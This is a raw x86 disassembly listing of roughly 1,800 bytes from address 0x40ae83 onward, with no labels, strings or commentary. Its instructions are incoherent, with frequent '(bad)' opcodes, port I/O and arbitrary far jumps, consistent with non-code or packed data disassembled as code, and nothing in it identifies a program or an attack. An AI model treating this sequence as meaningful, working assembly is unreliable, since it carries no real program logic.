  40ae83:	in     eax,0x2
  40ae85:	cdq    
  40ae86:	mov    ebx,0x4f5559bc
  40ae8b:	in     eax,dx
  40ae8c:	nop
  40ae8d:	add    DWORD PTR [edx+0x3e],0xffffff83
  40ae91:	lods   al,BYTE PTR ds:[esi]
  40ae92:	retf   
  40ae93:	add    esi,ebp
  40ae95:	cld    
  40ae96:	(bad)  [eax-0x5a3ac659]
  40ae9c:	pop    ds
  40ae9d:	das    
  40ae9e:	push   eax
  40ae9f:	in     al,0xb1
  40aea1:	shr    DWORD PTR [edx-0x7949d4e0],cl
  40aea7:	rcl    ebx,cl
  40aea9:	(bad)  
  40aeaa:	fsubr  QWORD PTR [esi]
  40aeac:	shl    DWORD PTR [eax],cl
  40aeae:	xchg   edx,edx
  40aeb0:	dec    esi
  40aeb1:	fwait
  40aeb2:	pushf  
  40aeb3:	pop    ds
  40aeb4:	or     eax,0xbf1f6138
  40aeb9:	int3   
  40aeba:	push   ecx
  40aebb:	jmp    0xf17862f2
  40aec0:	mov    ch,BYTE PTR [edx+0x34]
  40aec3:	inc    ecx
  40aec4:	or     ebx,DWORD PTR [eax]
  40aec6:	xchg   BYTE PTR [eax-0x2b],bl
  40aec9:	inc    ebx
  40aeca:	dec    esi
  40aecb:	pop    edi
  40aecc:	push   0x12e7c6d8
  40aed1:	and    al,0x42
  40aed3:	outs   dx,BYTE PTR ds:[esi]
  40aed4:	and    bl,0xd
  40aed7:	push   esp
  40aed8:	sbb    DWORD PTR [edi-0x4c3f1d0a],ebx
  40aede:	jle    0x40af2b
  40aee0:	jnp    0x40aecb
  40aee2:	fsub   st,st(0)
  40aee4:	inc    ecx
  40aee5:	fisubr DWORD PTR [edx+0x39460dc3]
  40aeeb:	adc    al,0xde
  40aeed:	mov    bp,0xfeac
  40aef1:	sbb    ah,BYTE PTR [edi]
  40aef3:	sbb    DWORD PTR [ebx],ecx
  40aef5:	fsub   st,st(1)
  40aef7:	cmp    BYTE PTR [esi],bh
  40aef9:	mov    esp,0x64573a99
  40aefe:	ins    BYTE PTR es:[edi],dx
  40aeff:	jmp    0xc943:0xfdfb4bd9
  40af06:	mov    al,ds:0xb62e6e1e
  40af0b:	cmp    bl,BYTE PTR [ebx]
  40af0d:	lea    esi,[ecx]
  40af0f:	loopne 0x40af34
  40af11:	out    0x54,eax
  40af13:	mov    eax,0xbccb4ab9
  40af18:	fisubr DWORD PTR [edi+ebp*8-0x33]
  40af1c:	jmp    DWORD PTR [edx+0x23844f9b]
  40af22:	data16 je 0x40af03
  40af25:	pop    ebp
  40af26:	std    
  40af27:	retf   0x2c5f
  40af2a:	add    BYTE PTR [ecx+0x7323d509],bl
  40af30:	mov    bh,0xf0
  40af32:	adc    eax,0x16d45dfb
  40af37:	push   edi
  40af38:	jmp    0xaf93adc
  40af3d:	cs xor eax,0x9ed31c39
  40af43:	or     ah,BYTE PTR [eiz*1-0x12d86f05]
  40af4a:	add    edi,esi
  40af4c:	iret   
  40af4d:	mov    edi,0xf34d9e20
  40af52:	test   DWORD PTR [ebx+0x47],eax
  40af55:	push   ds
  40af56:	je     0x40af36
  40af58:	mov    ds:0xb43fff6,al
  40af5d:	and    DWORD PTR [esi+edi*4-0x7f],ebp
  40af61:	or     al,0xf8
  40af63:	sbb    dl,BYTE PTR [ebp-0x28]
  40af66:	pusha  
  40af67:	add    DWORD PTR [ecx],0x33
  40af6a:	out    dx,al
  40af6b:	test   bl,dl
  40af6d:	xor    DWORD PTR [edx],eax
  40af6f:	fs fadd st(1),st
  40af72:	ja     0x40af9d
  40af74:	out    0xe4,eax
  40af76:	je     0x40afdd
  40af78:	aaa    
  40af79:	mov    WORD PTR [edx],cs
  40af7b:	into   
  40af7c:	xor    eax,DWORD PTR [ecx+eiz*1]
  40af7f:	pop    ds
  40af80:	dec    ecx
  40af81:	imul   eax,DWORD PTR [edi+0x4b],0xffffff86
  40af85:	jbe    0x40af7f
  40af87:	mov    dh,0xae
  40af89:	fwait
  40af8a:	sub    ebp,DWORD PTR [eax]
  40af8c:	js     0x40af2d
  40af8e:	pop    ss
  40af8f:	push   0xffffff9f
  40af91:	call   0xec7e:0xfa149e60
  40af98:	inc    eax
  40af99:	inc    ebp
  40af9a:	or     BYTE PTR [eax+0x11],bh
  40af9d:	jge    0x40afe6
  40af9f:	int    0xb1
  40afa1:	fs mov al,0x4f
  40afa4:	cmp    al,0x7b
  40afa6:	pop    ds
  40afa7:	mov    al,ds:0x34876837
  40afac:	mov    eax,0x4ff725a8
  40afb1:	jp     0x40af48
  40afb3:	cmp    al,0x8d
  40afb5:	jp     0x40b00e
  40afb7:	(bad)  
  40afb8:	(bad)  
  40afb9:	cmp    dl,BYTE PTR [ecx+0x53b8bdb6]
  40afbf:	cdq    
  40afc0:	jae    0x40b005
  40afc2:	loopne 0x40afab
  40afc4:	ret    0xf869
  40afc7:	cmp    al,0xdd
  40afc9:	mov    esp,0x7eb44b0f
  40afce:	loopne 0x40b03c
  40afd0:	mov    cl,0x3b
  40afd2:	push   es
  40afd3:	mov    edx,0x49b1567
  40afd8:	data16 sub BYTE PTR [edx-0x6ea938f4],dh
  40afdf:	in     al,0xfd
  40afe1:	push   0xffffffe4
  40afe3:	or     dh,0x61
  40afe6:	push   eax
  40afe7:	adc    bl,BYTE PTR [eax-0x1168f7ae]
  40afed:	rcl    ebp,1
  40afef:	test   BYTE PTR [ebx-0x28],ah
  40aff2:	in     eax,dx
  40aff3:	jo     0x40af7a
  40aff5:	cdq    
  40aff6:	data16 ficom DWORD PTR [ebx+0x67]
  40affa:	dec    ecx
  40affb:	fs sti 
  40affd:	mov    eax,0xd74fe3a2
  40b002:	loop   0x40afab
  40b004:	loope  0x40b025
  40b006:	mov    ah,BYTE PTR [ebx+0x9]
  40b009:	add    ch,al
  40b00b:	xchg   edi,eax
  40b00c:	cmp    DWORD PTR [edi+0x26],0x7f
  40b010:	aas    
  40b011:	out    dx,eax
  40b012:	(bad)  
  40b013:	fild   QWORD PTR [eax]
  40b015:	ret    0x22a7
  40b018:	imul   BYTE PTR [edx+0x70]
  40b01b:	or     dh,BYTE PTR [edx+0x5e00a017]
  40b021:	push   es
  40b022:	sub    al,0x26
  40b024:	jecxz  0x40b096
  40b026:	lods   eax,DWORD PTR ds:[esi]
  40b027:	cmp    esp,eax
  40b029:	xor    eax,0xb9c689b7
  40b02e:	call   0x386d:0xa2522441
  40b035:	mov    esp,0x3458f2d0
  40b03a:	les    ebp,FWORD PTR [edi+edx*4+0x7c]
  40b03e:	hlt    
  40b03f:	push   ebp
  40b040:	adc    edi,ebx
  40b042:	cmp    ah,BYTE PTR [eax-0x2c]
  40b045:	ja     0x40afdc
  40b047:	aad    0x83
  40b049:	adc    cl,BYTE PTR [ebx]
  40b04b:	test   bl,bl
  40b04d:	pop    edi
  40b04e:	push   ds
  40b04f:	ss ins BYTE PTR es:[edi],dx
  40b051:	xchg   esi,eax
  40b052:	idiv   BYTE PTR [edi-0x6ea2f765]
  40b058:	mov    cs,WORD PTR [ebp+0x2c4e6af6]
  40b05e:	jle    0x40b01a
  40b060:	lods   eax,DWORD PTR ds:[esi]
  40b061:	rcl    DWORD PTR [edx],cl
  40b063:	sub    DWORD PTR [edi+ebp*2],0xa4bd8489
  40b06a:	jb     0x40b0b4
  40b06c:	mov    ch,0x34
  40b06e:	sbb    DWORD PTR [esi-0x7c2b0dc1],edi
  40b074:	or     esi,DWORD PTR gs:[eax-0x5a13d283]
  40b07b:	xchg   bp,ax
  40b07d:	lahf   
  40b07e:	adc    al,0xae
  40b080:	and    esp,eax
  40b082:	mov    edx,0xde0856f8
  40b087:	(bad)  
  40b088:	jbe    0x40b0eb
  40b08a:	xchg   ecx,eax
  40b08b:	iret   
  40b08c:	data16 lahf 
  40b08e:	out    dx,eax
  40b08f:	pop    esi
  40b090:	sub    eax,0xd2a80b88
  40b095:	test   DWORD PTR [ebx-0x277f8877],ecx
  40b09b:	xchg   ebp,eax
  40b09c:	xchg   esp,edi
  40b09e:	inc    ecx
  40b09f:	(bad)  
  40b0a0:	loop   0x40b0a9
  40b0a2:	int3   
  40b0a3:	int    0xb
  40b0a5:	cmc    
  40b0a6:	add    DWORD PTR [edx+ecx*4-0x44],ebx
  40b0aa:	pop    ds
  40b0ab:	cwde   
  40b0ac:	mov    gs,WORD PTR [ebx-0x21]
  40b0af:	pushf  
  40b0b0:	mov    ecx,0x99c18609
  40b0b5:	fisubr DWORD PTR [ebx+0x2b]
  40b0b8:	cmp    dl,BYTE PTR [ecx-0x16]
  40b0bb:	add    eax,0xe151260d
  40b0c0:	push   ebp
  40b0c1:	and    DWORD PTR [ecx+0x628ea2bd],esi
  40b0c7:	mov    dl,BYTE PTR [esi+0x1c84a798]
  40b0cd:	mov    ebx,DWORD PTR [eax-0x2d]
  40b0d0:	out    dx,eax
  40b0d1:	ret    0x31f6
  40b0d4:	(bad)  
  40b0d5:	mul    BYTE PTR [esi]
  40b0d7:	mov    bh,0xac
  40b0d9:	outs   dx,DWORD PTR ds:[esi]
  40b0da:	inc    edx
  40b0db:	xchg   BYTE PTR [ebp-0x18],bh
  40b0de:	std    
  40b0df:	outs   dx,DWORD PTR ds:[esi]
  40b0e0:	push   ebx
  40b0e1:	lea    eax,[eax+eiz*1-0x12]
  40b0e5:	jmp    0x40b092
  40b0e7:	imul   edi,DWORD PTR ds:0x16d7e052,0x49d3e44
  40b0f1:	inc    ebp
  40b0f2:	retf   
  40b0f3:	std    
  40b0f4:	hlt    
  40b0f5:	xor    dh,ch
  40b0f7:	icebp  
  40b0f8:	jmp    0xc645f62c
  40b0fd:	(bad)  
  40b0fe:	mov    cl,0x6d
  40b100:	in     al,0xf6
  40b102:	shr    BYTE PTR [ecx],0xb0
  40b105:	sub    edi,ebp
  40b107:	add    cl,dh
  40b109:	pop    ds
  40b10a:	hlt    
  40b10b:	inc    ebx
  40b10c:	jp     0x40b189
  40b10e:	ins    BYTE PTR es:[edi],dx
  40b10f:	lds    edx,FWORD PTR [ebp+0x20]
  40b112:	retf   0x5186
  40b115:	mov    dl,0x77
  40b117:	push   edi
  40b118:	retf   0xe148
  40b11b:	and    ebx,ecx
  40b11d:	inc    esp
  40b11e:	cli    
  40b11f:	in     eax,dx
  40b120:	and    DWORD PTR [bp+si+0x4b],ebp
  40b124:	test   DWORD PTR [ebx],edx
  40b126:	out    0xd9,eax
  40b128:	mov    dl,0xfe
  40b12a:	jo     0x40b181
  40b12c:	(bad)  
  40b12d:	out    0xd5,eax
  40b12f:	mov    esi,DWORD PTR [esi]
  40b131:	xchg   edx,eax
  40b132:	les    edi,FWORD PTR [esi-0x46]
  40b135:	or     DWORD PTR [esi*8+0x5ffc5d0c],ebp
  40b13c:	pop    esi
  40b13d:	xchg   ebx,eax
  40b13e:	jo     0x40b172
  40b140:	inc    ecx
  40b141:	jae    0x40b0c9
  40b143:	sbb    DWORD PTR [ecx*4-0x20f90976],edx
  40b14a:	hlt    
  40b14b:	dec    ebx
  40b14c:	pop    ebp
  40b14d:	pop    ecx
  40b14e:	and    BYTE PTR [edx],0xf3
  40b151:	in     al,dx
  40b152:	inc    DWORD PTR [edx]
  40b154:	sub    al,0xfe
  40b156:	xor    BYTE PTR [eax+edi*4-0xcc0e734],dl
  40b15d:	in     al,dx
  40b15e:	(bad)  
  40b15f:	(bad)
  40b162:	stos   BYTE PTR es:[edi],al
  40b163:	test   ebp,0x5d29a821
  40b169:	fild   WORD PTR [eax]
  40b16b:	fstp   st(1)
  40b16d:	aaa    
  40b16e:	bnd ret 0x90dc
  40b172:	mov    DWORD PTR [ecx-0x3fce697b],edi
  40b178:	scas   eax,DWORD PTR es:[edi]
  40b179:	inc    eax
  40b17a:	cdq    
  40b17b:	cmp    eax,0x6cdfa786
  40b180:	mov    ?,WORD PTR [edi-0x258380d6]
  40b186:	adc    BYTE PTR [esi-0x61f3997e],bh
  40b18c:	in     al,0xe1
  40b18e:	mov    ecx,0x81088912
  40b193:	out    0x7c,eax
  40b195:	jecxz  0x40b161
  40b197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b198:	es sbb eax,0x839f5386
  40b19e:	xor    BYTE PTR [esp+ebp*4-0x5ade4289],bl
  40b1a5:	int    0x95
  40b1a7:	xlat   BYTE PTR ds:[ebx]
  40b1a8:	cmp    ch,al
  40b1aa:	adc    ebp,DWORD PTR [ebx-0x6]
  40b1ad:	push   es
  40b1ae:	mov    al,ds:0xbe5c1e4d
  40b1b3:	jne    0x40b1a6
  40b1b5:	jge    0x40b1ee
  40b1b7:	retf   0x268
  40b1ba:	mov    bh,al
  40b1bc:	add    eax,0x2bc5202e
  40b1c1:	cmp    BYTE PTR [edx-0x80],0x6f
  40b1c5:	mov    BYTE PTR [edi+0x114d6be3],bh
  40b1cb:	sub    al,0x5c
  40b1cd:	pushf  
  40b1ce:	outs   dx,BYTE PTR ds:[esi]
  40b1cf:	in     al,0xe9
  40b1d1:	sahf   
  40b1d2:	xchg   ebx,eax
  40b1d3:	push   edi
  40b1d4:	inc    edx
  40b1d5:	sahf   
  40b1d6:	jmp    0xa249:0xb360493e
  40b1dd:	sbb    eax,0x149cf005
  40b1e2:	jb     0x40b172
  40b1e4:	shl    BYTE PTR [ecx-0x56],cl
  40b1e7:	or     ebp,DWORD PTR ds:0x6d45a8ef
  40b1ed:	inc    ecx
  40b1ee:	mov    ah,0xf1
  40b1f0:	pop    edi
  40b1f1:	push   ebp
  40b1f2:	cld    
  40b1f3:	addr16 push ds
  40b1f5:	in     eax,dx
  40b1f6:	mov    ds:0xd22d4411,al
  40b1fb:	cli    
  40b1fc:	imul   eax,DWORD PTR [edx-0x68],0x84258837
  40b203:	int3   
  40b204:	jae    0x40b248
  40b206:	sub    DWORD PTR [esi-0x67e170d9],edx
  40b20c:	test   DWORD PTR [ebp+ebx*8+0x2d],0x6d8d5d7
  40b214:	scas   eax,DWORD PTR es:[edi]
  40b215:	sbb    esp,DWORD PTR [ebx-0x2b]
  40b218:	pushf  
  40b219:	in     al,0xda
  40b21b:	rcl    DWORD PTR [ecx],cl
  40b21d:	adc    BYTE PTR [edx-0x27f539a1],0xaa
  40b224:	ss (bad) 
  40b226:	mov    bh,0x4c
  40b228:	sbb    al,0x20
  40b22a:	mov    cl,0x2b
  40b22c:	fst    QWORD PTR [ebp+0x437ba3fd]
  40b232:	sub    DWORD PTR [ebp+0x54],edi
  40b235:	or     al,0xca
  40b237:	fwait
  40b238:	shl    dl,0x76
  40b23b:	pop    eax
  40b23c:	int    0xe4
  40b23e:	shr    DWORD PTR [edi-0x12],1
  40b241:	repnz es aad 0x7
  40b245:	icebp  
  40b246:	into   
  40b247:	cmp    al,0xe
  40b249:	ja     0x40b296
  40b24b:	xlat   BYTE PTR ds:[ebx]
  40b24c:	or     DWORD PTR ds:0x666c8dee,ebp
  40b252:	loopne 0x40b236
  40b254:	pop    esp
  40b255:	adc    DWORD PTR [edi-0x51],esp
  40b258:	jl     0x40b1f7
  40b25a:	fcom   QWORD PTR [esi+edx*8-0x4cfe4ce3]
  40b261:	mul    BYTE PTR [ecx]
  40b263:	xchg   DWORD PTR [edx],esi
  40b265:	adc    eax,0xd4b2668e
  40b26a:	cmc    
  40b26b:	popf   
  40b26c:	jno    0x40b203
  40b26e:	xor    ebp,DWORD PTR [edx]
  40b270:	gs xchg ecx,eax
  40b272:	sub    dl,BYTE PTR [edi+0x7f]
  40b275:	xchg   esp,eax
  40b276:	xchg   DWORD PTR [edi],ebp
  40b278:	inc    eax
  40b279:	in     al,0x8e
  40b27b:	dec    ecx
  40b27c:	fucomp st(3)
  40b27e:	arpl   WORD PTR [ebx-0x1e72635f],sp
  40b284:	push   ebp
  40b285:	ins    BYTE PTR es:[edi],dx
  40b286:	jnp    0x40b2d7
  40b288:	sub    edx,edi
  40b28a:	imul   edx,DWORD PTR [esi+ecx*4-0x4e],0x1d
  40b28f:	pop    eax
  40b290:	push   es
  40b291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b292:	imul   eax,DWORD PTR [esi-0x73],0xfffffff5
  40b296:	add    esp,esp
  40b298:	ja     0x40b254
  40b29a:	and    esp,eax
  40b29c:	xor    al,ch
  40b29e:	imul   ecx,DWORD PTR [ecx-0x9],0xffffffa5
  40b2a2:	daa    
  40b2a3:	push   0xffffffbb
  40b2a5:	xor    ch,ch
  40b2a7:	jbe    0x40b327
  40b2a9:	ret    
  40b2aa:	stos   BYTE PTR es:[edi],al
  40b2ab:	inc    esi
  40b2ac:	mov    al,0x52
  40b2ae:	cs ja  0x40b30e
  40b2b1:	xchg   ebp,eax
  40b2b2:	sub    al,0x90
  40b2b4:	ins    BYTE PTR es:[edi],dx
  40b2b5:	and    BYTE PTR [edi+0x49],dh
  40b2b8:	adc    bx,WORD PTR ds:0xc7431bbf
  40b2bf:	xor    DWORD PTR [edx-0x514729d7],ebx
  40b2c5:	adc    BYTE PTR [ebp-0x47a020f7],ah
  40b2cb:	out    0x75,al
  40b2cd:	out    0x7d,al
  40b2cf:	outs   dx,DWORD PTR ds:[esi]
  40b2d0:	xlat   BYTE PTR ds:[ebx]
  40b2d1:	xchg   BYTE PTR [edx-0x2311b47],dh
  40b2d7:	jg     0x40b309
  40b2d9:	push   ecx
  40b2da:	xor    dl,BYTE PTR [eax-0x5e882325]
  40b2e0:	jle    0x40b33b
  40b2e2:	(bad)  
  40b2e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2e4:	scas   al,BYTE PTR es:[edi]
  40b2e5:	xchg   edi,eax
  40b2e6:	iret   
  40b2e7:	mov    dh,0xe7
  40b2e9:	scas   eax,DWORD PTR es:[edi]
  40b2ea:	aad    0x24
  40b2ec:	cmp    edi,DWORD PTR [esi]
  40b2ee:	fist   DWORD PTR [edx+eiz*2+0xd]
  40b2f2:	mov    ah,0xaf
  40b2f4:	push   cs
  40b2f5:	xlat   BYTE PTR ds:[ebx]
  40b2f6:	(bad)  
  40b2f7:	aad    0xaf
  40b2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2fb:	push   esi
  40b2fc:	sbb    BYTE PTR [ebx-0x79294899],dh
  40b302:	jg     0x40b2d2
  40b304:	inc    ecx
  40b305:	mov    cl,0xd1
  40b307:	mov    ds:0xb0481f24,al
  40b30c:	push   ebp
  40b30d:	fstp   QWORD PTR [esi]
  40b30f:	jbe    0x40b298
  40b311:	push   ebx
  40b312:	lock and bh,BYTE PTR [ecx+0x2]
  40b316:	pushf  
  40b317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b318:	mov    fs,WORD PTR [edi]
  40b31a:	fimul  WORD PTR [esi]
  40b31c:	inc    ebx
  40b31d:	jb     0x40b30a
  40b31f:	mov    eax,0x18bfd283
  40b324:	neg    DWORD PTR [eax+0x12a527fe]
  40b32a:	out    0x7e,al
  40b32c:	xor    BYTE PTR [eax],0xc1
  40b32f:	add    dh,BYTE PTR [ebx+0x269e1fc4]
  40b335:	add    ch,bl
  40b337:	and    eax,ebp
  40b339:	cmp    ecx,ebp
  40b33b:	push   ebx
  40b33c:	push   ecx
  40b33d:	lods   eax,DWORD PTR ds:[esi]
  40b33e:	ss jge 0x40b300
  40b341:	cdq    
  40b342:	dec    esp
  40b343:	sbb    al,0x3c
  40b345:	dec    esp
  40b346:	in     eax,dx
  40b347:	data16 xor dl,BYTE PTR [eax]
  40b34a:	imul   ebx,DWORD PTR [ecx],0x3b
  40b34d:	inc    edi
  40b34e:	imul   ecx,DWORD PTR [edi-0x3f11663],0x9e8c0886
  40b358:	daa    
  40b359:	push   ecx
  40b35a:	push   0x16b87aaa
  40b35f:	stos   DWORD PTR es:[edi],eax
  40b360:	or     eax,0xa107bfed
  40b365:	mov    ebp,0x2f14fce1
  40b36a:	xchg   ebx,eax
  40b36b:	outs   dx,DWORD PTR ds:[esi]
  40b36c:	lods   eax,DWORD PTR ds:[esi]
  40b36d:	pusha  
  40b36e:	xor    al,0x6c
  40b370:	dec    edx
  40b371:	sbb    bl,al
  40b373:	fwait
  40b374:	or     BYTE PTR [ebx],0xa4
  40b377:	lds    edi,FWORD PTR [eax-0xd]
  40b37a:	lea    eax,[ecx+ecx*2]
  40b37d:	jmp    esp
  40b37f:	push   cs
  40b380:	mov    esp,DWORD PTR [eax+0x6ee5973c]
  40b386:	(bad)  
  40b387:	ds sbb edx,esp
  40b38a:	popa   
  40b38b:	(bad)  
  40b38c:	lds    ebx,FWORD PTR [edx]
  40b38e:	jnp    0x40b384
  40b390:	out    dx,eax
  40b391:	pminsw mm3,QWORD PTR [ebx+0x700806a7]
  40b398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b399:	stc    
  40b39a:	outs   dx,BYTE PTR ds:[esi]
  40b39b:	imul   eax,DWORD PTR [edi-0xa5a5b8c],0x61
  40b3a2:	ret    0x9e14
  40b3a5:	imul   eax,esi,0xffffffe6
  40b3a8:	mov    DWORD PTR [eiz*2-0x34fd96b],0x8d2e30da
  40b3b3:	sbb    al,0xac
  40b3b5:	xchg   edx,eax
  40b3b6:	dec    ebp
  40b3b7:	call   0xec19:0x8d113ba0
  40b3be:	mov    ds:0x835475e2,eax
  40b3c3:	cmp    esp,ecx
  40b3c5:	mov    bl,BYTE PTR [esp+ebx*4+0x38]
  40b3c9:	pusha  
  40b3ca:	add    eax,DWORD PTR [ebx-0x7d90b101]
  40b3d0:	in     eax,dx
  40b3d1:	dec    ecx
  40b3d2:	fs test BYTE PTR gs:[esi+0x16495a0f],cl
  40b3da:	call   FWORD PTR [edi-0xa164c0e]
  40b3e0:	inc    esi
  40b3e1:	call   0xfa62:0xfee2d192
  40b3e8:	in     eax,dx
  40b3e9:	pop    ebp
  40b3ea:	fld    TBYTE PTR [ebp+0x74f1da3e]
  40b3f0:	xor    ecx,ecx
  40b3f2:	cdq    
  40b3f3:	add    eax,ebx
  40b3f5:	ins    DWORD PTR es:[edi],dx
  40b3f6:	outs   dx,BYTE PTR ds:[esi]
  40b3f7:	ins    BYTE PTR es:[edi],dx
  40b3f8:	push   es
  40b3f9:	pop    eax
  40b3fa:	cmp    DWORD PTR [edx],ebx
  40b3fc:	pop    edx
  40b3fd:	das    
  40b3fe:	push   esp
  40b3ff:	shr    BYTE PTR [ecx-0x66],1
  40b402:	push   ss
  40b403:	iret   
  40b404:	jb     0x40b455
  40b406:	dec    edx
  40b407:	jae    0x40b3e9
  40b409:	adc    eax,0x3af6cbf3
  40b40e:	les    ebx,FWORD PTR [ecx+0x2484f078]
  40b414:	fsubr  QWORD PTR [edx]
  40b416:	sub    DWORD PTR [eax+eiz*2],ecx
  40b419:	call   0x9f7e:0x10c7ab3a
  40b420:	pop    ebp
  40b421:	sbb    al,0xa9
  40b423:	xor    al,0x6b
  40b425:	stc    
  40b426:	data16 jns 0x40b3cd
  40b429:	test   ebp,0x6f9993a6
  40b42f:	adc    eax,0xa71abee9
  40b434:	mov    ch,0x6b
  40b436:	jne    0x40b470
  40b438:	jg     0x40b4a0
  40b43a:	shl    DWORD PTR [ebx-0x70552fb1],0x1c
  40b441:	shl    BYTE PTR [eax],cl
  40b443:	imul   BYTE PTR [ebp+0x7851b9e2]
  40b449:	not    cl
  40b44b:	sbb    al,0x9a
  40b44d:	pop    esp
  40b44e:	je     0x40b45a
  40b450:	repz mov ecx,0x84d3da02
  40b456:	mov    al,ds:0x41582347
  40b45b:	sahf   
  40b45c:	lods   al,BYTE PTR ds:[esi]
  40b45d:	xor    BYTE PTR [eax+0x57c0f7ef],al
  40b463:	pop    ecx
  40b464:	(bad)  
  40b465:	push   cs
  40b466:	inc    eax
  40b467:	lock arpl sp,sp
  40b46a:	push   es
  40b46b:	clc    
  40b46c:	imul   ebp,DWORD PTR [edi-0x3d],0xfffffff1
  40b470:	mov    ds:0x8cfe53d7,eax
  40b475:	inc    ebp
  40b476:	sub    al,0xa9
  40b478:	outs   dx,BYTE PTR ds:[esi]
  40b479:	retf   0x89a2
  40b47c:	call   0x9c9d:0xa54fb784
  40b483:	sti    
  40b484:	lods   eax,DWORD PTR ss:[esi]
  40b486:	push   esp
  40b487:	test   al,0xe0
  40b489:	push   0x1
  40b48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b48c:	or     DWORD PTR [ecx+0x12],0xdad37dad
  40b493:	ins    DWORD PTR es:[edi],dx
  40b494:	inc    ebp
  40b495:	mov    BYTE PTR [esi+edi*2+0x414c13d5],al
  40b49c:	ret    0x6469
  40b49f:	add    al,ch
  40b4a1:	fild   DWORD PTR [ecx]
  40b4a3:	out    dx,al
  40b4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4a5:	push   eax
  40b4a6:	out    dx,al
  40b4a7:	cmp    DWORD PTR [eax+edi*4-0x67],ebx
  40b4ab:	jecxz  0x40b4e4
  40b4ad:	stc    
  40b4ae:	pop    ebx
  40b4af:	shl    bh,1
  40b4b1:	xor    al,0xba
  40b4b3:	sub    dl,BYTE PTR [edx+0x2c]
  40b4b6:	fisubr DWORD PTR [esp+esi*1+0x33c32a6a]
  40b4bd:	dec    esp
  40b4be:	add    al,0x1e
  40b4c0:	jbe    0x40b469
  40b4c2:	pop    esi
  40b4c3:	fidiv  DWORD PTR [esi+0x194dea95]
  40b4c9:	pusha  
  40b4ca:	or     eax,0x44d50346
  40b4cf:	cmp    al,BYTE PTR fs:[edi]
  40b4d2:	push   ebx
  40b4d3:	xor    BYTE PTR [esi-0x4e],0x37
  40b4d7:	jne    0x40b465
  40b4d9:	pop    es
  40b4da:	dec    ebx
  40b4db:	mov    ?,WORD PTR [eax]
  40b4dd:	test   DWORD PTR [ebp+0x7172519d],ebp
  40b4e3:	fild   WORD PTR [edx-0x3376b6fe]
  40b4e9:	mov    ch,0x56
  40b4eb:	test   BYTE PTR [edx+0xcf40360],ch
  40b4f1:	int    0xd9
  40b4f3:	jmp    0x47868d3f
  40b4f8:	in     al,dx
  40b4f9:	add    al,0x18
  40b4fb:	in     eax,0xf1
  40b4fd:	(bad)  
  40b4fe:	sbb    bh,dl
  40b500:	inc    edx
  40b501:	or     al,BYTE PTR [edx]
  40b503:	mov    ecx,0xaaee021a
  40b508:	cld    
  40b509:	or     edi,DWORD PTR [ecx]
  40b50b:	inc    edi
  40b50c:	popf   
  40b50d:	pop    edx
  40b50e:	ss pop ecx
  40b510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b511:	test   al,0xfb
  40b513:	and    ecx,DWORD PTR [esi-0x74]
  40b516:	pop    ecx
  40b517:	cmp    al,BYTE PTR [edi]
  40b519:	sar    DWORD PTR [ecx+ecx*2],1
  40b51c:	ja     0x40b504
  40b51e:	and    dl,BYTE PTR [edi]
  40b520:	or     BYTE PTR [edx],bh
  40b522:	(bad)  
  40b523:	or     eax,0x774ae266
  40b528:	dec    ecx
  40b529:	scas   al,BYTE PTR es:[edi]
  40b52a:	shl    DWORD PTR [eax+0x6fae6116],cl
  40b530:	pmulhuw mm4,QWORD PTR [esi-0x72]
  40b534:	(bad)  
  40b535:	ret    
  40b536:	push   esi
  40b537:	mov    ds:0xc3e5bb4c,al
  40b53c:	push   edi
  40b53d:	out    dx,eax
  40b53e:	mov    edx,0xdfc7e33a
  40b543:	mov    dh,0xb1
  40b545:	dec    eax
  40b546:	jecxz  0x40b4e0
  40b548:	xchg   ebp,eax
  40b549:	mov    esp,0x91802968
  40b54e:	sbb    BYTE PTR [edx-0x1f4054cc],dh
  40b554:	je     0x40b4dc
  40b556:	aam    0x1d
  40b558:	iret   
  40b559:	mov    edi,0x1ef2ddde
  40b55e:	ds clc 
  40b560:	pop    esp
  40b561:	mov    BYTE PTR [edi-0x59316561],ch
  40b567:	or     al,0x60
  40b569:	xchg   ebx,eax
  40b56a:	dec    ebx
  40b56b:	push   edi
  40b56c:	pop    ecx
  40b56d:	outs   dx,DWORD PTR ds:[esi]
  40b56e:	out    0x38,al
  40b570:	fisubr WORD PTR [edi+eax*8]
  40b573:	xor    eax,0x7aff768d
  40b578:	adc    al,0xf8
  40b57a:	pop    ss
  40b57b:	test   eax,0x85c1b93
  40b580:	adc    bl,0xf6
  40b583:	lds    ecx,FWORD PTR [edi+0x30b02299]
  40b589:	jnp    0x40b571
  40b58b:	fwait
  40b58c:	data16 fimul DWORD PTR [ecx]
  40b590:	std    
  40b591:	jmp    0xb35b:0xc9d15b6b
  40b598:	xchg   ecx,eax
  40b599:	jecxz  0x40b539
  40b59b:	fs xchg esi,eax
  40b59d:	repnz pop eax
  40b59f:	cmp    BYTE PTR [edi-0x3af3c58c],bl
  40b5a5:	cmp    ah,BYTE PTR [esi-0xc759b31]
  40b5ab:	outs   dx,DWORD PTR ds:[esi]
  40b5ac:	xor    edx,DWORD PTR [esi-0x5a]
  40b5af:	cmp    eax,DWORD PTR [eax-0x651a74ec]
  40b5b5:	das    
  40b5b6:	push   cs
  40b5b7:	shl    BYTE PTR [edi],1
  40b5b9:	lahf   
  40b5ba:	pop    es
  40b5bb:	cmp    eax,ecx
  40b5bd:	xchg   ecx,eax
  40b5be:	call   0x486142e3
  40b5c3:	xlat   BYTE PTR ds:[ebx]
  40b5c4:	fld    TBYTE PTR [eax+0x17]
  40b5c7:	out    0x58,eax
  40b5c9:	push   edi
  40b5ca:	es cwde 
  40b5cc:	jecxz  0x40b5f9
  40b5ce:	jge    0x40b5cb
  40b5d0:	xor    al,0x6d
  40b5d2:	pop    es
  40b5d3:	jbe    0x40b5f7
  40b5d5:	test   BYTE PTR [edi-0x17dcce8d],ah
  40b5db:	adc    al,0x7c
  40b5dd:	xchg   ebx,eax
  40b5de:	xchg   esp,eax
